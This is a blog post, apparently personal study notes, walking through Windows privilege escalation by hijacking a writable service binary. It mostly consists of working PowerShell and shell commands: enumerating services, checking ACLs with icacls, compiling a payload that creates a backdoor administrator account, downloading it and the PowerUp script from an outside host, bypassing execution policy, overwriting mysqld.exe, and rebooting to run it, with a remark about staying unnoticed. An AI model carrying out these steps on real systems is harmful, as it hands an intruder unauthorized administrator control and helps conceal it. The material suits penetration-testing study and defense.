---
layout: post
title: Windows Service Binary Hijacking
titledate: 09/15/23
tags: ["infosec","offsec", "privesc", "powershell", "exploit", "powerup"]
---

#### hijacking binary services

in some instances software services may be tied to binaries that are given open permisions - if the user has the ability to read and write then we can replace the binary with our own and restart the service or computer to allow it to execute in the context of the system user

### NOTE: when using a network logon like - WinRM or a bind shell these commands Get-CimInstance and Get-Service will not have permissions if the user does not have admin privs but RDP can get around this

to list the services with their corresponding path

    PS > Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

the result of this comman displays a couple services that are located in a non Windows system directory like \Xampp - this means that the developer would be responsible for managing the permissions of the binary application for the running service and they would be worth inspecting

to check permissions we can use icacls and Get-ACL

    $ icacls "C:\xampp\apache\bin\httpd.exe"

    user (RX)

    $ icacls "C:\xampp\mysql\bin\mysqld.exe"

    user (F)

the rx means the user can read and execute but we cannot write so we are unable to overwrite or replace the binary with ours - the F means we have full access to the binary

for this example we will create compile an executable that adds a user with the following commands

    i = system ("net user user2 password123! /add");
    i = system ("net localgroup administrators user2 /add");

since we have access to the target machine we will copy the binary over

    PS > iwr -uri http://192.168.1.1/adduser.exe -Outfile adduser.exe

we backup the original service just in case we want to restore operation and go unnoticed

    PS > move C:\xampp\mysql\bin\mysqld.exe mysqld.exe

and then copy our binary over

    PS > move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

finally we need to restart the service which can be achieved several ways if priveleges permit

    PS > net stop mysql

    PS > Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

this cmd will tell us if the service has auto startup enabled

if this is the case we can reboot the machine if allowed

    PS > shutdown /r /t 0

once rebooted the malicious service should be running and we can check to see if our code has been executed

    PS > Get-LocalGroupMember administrators

#### PowerUp service hijacking

now let's use a powershell script to see if it can detect these binaries that can be replaced

    $ python3 -m http.server 80

    PS > iwr -uri http://192.168.1.1/PowerUp.ps1 -Outfile PowerUp.ps1

copying the script over

    PS > powershell -ep bypass

ep bypsass to execute the script

    PS > ./PowerUp.ps1

    PS > Get-ModifiableServiceFile

this will identify writeable services - then we can even attempt to overwrite them with PowerUp

    PS > Install-ServiceBinary -Name 'mysql'

### NOTE: this functionality of the script may fail so should be verified manually

